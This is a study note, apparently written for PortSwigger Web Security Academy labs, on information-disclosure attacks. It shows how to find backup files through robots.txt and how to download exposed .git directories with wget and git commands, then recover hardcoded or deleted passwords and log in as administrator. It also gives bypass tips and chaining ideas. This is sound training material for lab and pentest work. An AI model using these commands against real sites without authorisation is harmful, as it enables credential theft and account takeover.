# Information disclosure — Exposed files (backup files, .git history)

robots.txt discloses hidden directories; backup source files contain hardcoded credentials; an exposed `.git` directory lets you reconstruct full commit history and read deleted secrets from diffs.

## Quick reference
```
# robots.txt → backup directory
GET /robots.txt  ->  Disallow: /backup
GET /backup/     ->  ProductTemplate.java.bak (directory listing)
GET /backup/ProductTemplate.java.bak  ->  hardcoded DB password in source

# Exposed .git
GET /.git/        ->  directory listing (git data exposed)
wget -r https://TARGET/.git/
git log --oneline
# find "Remove admin password" commit
git show <commit-hash>
# read the diff: - password = "hardcoded-secret"
```

## Root cause
- Backup files (`.bak`, `.old`, `.tmp`) placed in web root remain accessible over HTTP.
- robots.txt intends to hide paths from search engines but reveals them to attackers.
- VCS directories (`.git`, `.svn`) accidentally deployed to production — the full object store is served over HTTP, enabling local reconstruction of any commit.

## Find it
1. Always browse `/robots.txt` → note all `Disallow:` paths → browse each one.
2. Burp content discovery → discover `/backup`, `/temp`, `/archive` directories.
3. Try appending `.bak`, `.old`, `.~`, `.swp` to any interesting path.
4. GET `/.git/HEAD` — if response is `ref: refs/heads/main` → .git exposed.

## Technique
**Backup file (robots.txt → .bak):**
1. `GET /robots.txt` → note `Disallow: /backup`.
2. `GET /backup/` → directory listing shows `ProductTemplate.java.bak`.
3. `GET /backup/ProductTemplate.java.bak` → download source file.
4. Grep for `password`, `secret`, `credential`, `DB_PASSWORD` in file content.

**Exposed .git:**
1. `GET /.git/HEAD` → returns `ref: refs/heads/main` → .git directory is live.
2. `wget -r https://TARGET/.git/` — recursively downloads all git objects.
3. `cd TARGET/.git && git log --oneline` — list all commits.
4. Spot commit message like `"Remove admin password from config"`.
5. `git show <commit-hash>` → diff shows `-password = "cleartext-value"` → extract.
6. Log in as administrator with extracted password → /admin → delete carlos.

## Payload arsenal
```bash
# Check robots.txt
curl https://TARGET/robots.txt

# Check .git exposure
curl https://TARGET/.git/HEAD  # should return "ref: refs/heads/..."

# Download entire .git dir
wget -r https://TARGET/.git/

# Navigate to cloned dir and inspect
cd TARGET.web-security-academy.net/.git
git log --oneline
git show <commit-hash>
```

## Bypasses
| Issue | Approach |
|---|---|
| No directory listing | Try common backup names directly (index.php.bak, config.php.bak) |
| wget can't reconstruct .git | Use `git-dumper` tool for more robust reconstruction |
| Commit message doesn't hint content | `git log -p` (patch output) — search all diffs for "password" |

## Exploitation walkthrough
**Backup file:**
1. `/robots.txt` → `Disallow: /backup`.
2. `/backup/` → `ProductTemplate.java.bak`.
3. Read file → `connection = "jdbc:postgresql://localhost/postgres?user=postgres&password=<HARDCODED>"`.
4. Submit password.

**Version control:**
1. `GET /.git` → directory listing visible.
2. `wget -r https://TARGET/.git/`.
3. `git log --oneline` → commit `"Remove admin password from config"`.
4. `git show <hash>` → `-ADMIN_PASSWORD = "hunter2"`.
5. Log in as administrator:hunter2 → /admin → delete carlos.

## Chaining
- Hardcoded DB password → direct DB access / [SQL-injection](../../SQL-injection/) (credentials for query auth).
- Admin password from .git → account takeover → [Access-control](../../Access-control/).
- Source code review → find hidden endpoints, other logic flaws → [Business-logic-vulnerabilities](../../Business-logic-vulnerabilities/).

## Tools
- **`wget -r`** — recursive .git download (Linux)
- **`git-dumper`** — more robust .git reconstruction tool (BApp store / pip)
- **Burp content discovery** — find /backup, /temp, hidden dirs
- **Burp "Find comments"** — surface path hints in HTML

## Labs

### Source code disclosure via backup files [Apprentice]
`/robots.txt` → `/backup` disallowed → `/backup/ProductTemplate.java.bak` → hardcoded Postgres DB password in connection string. Key insight: robots.txt reveals hidden paths; backup files contain real secrets.

### Information disclosure in version control history [Practitioner]
`GET /.git` → exposed. `wget -r .../.git/` → `git log --oneline` → commit "Remove admin password from config" → `git show <hash>` → diff reveals cleartext admin password → log in → delete carlos. Key insight: git history permanently records deleted secrets unless history is rewritten.

## Real-world notes
- `.git` exposure is a critical finding in any pentest/bug bounty — full source code + all secrets from day one.
- robots.txt is used by real attackers as a recon starting point; never list sensitive paths there.
- Backup file naming varies: `.bak`, `.old`, `~file`, `.swp`, `file.php.1` — fuzz all of them.
- `git-dumper` handles chunked/incomplete .git reconstructions that `wget -r` misses.

## References
- https://portswigger.net/web-security/information-disclosure/exploiting#common-sources-of-information-disclosure
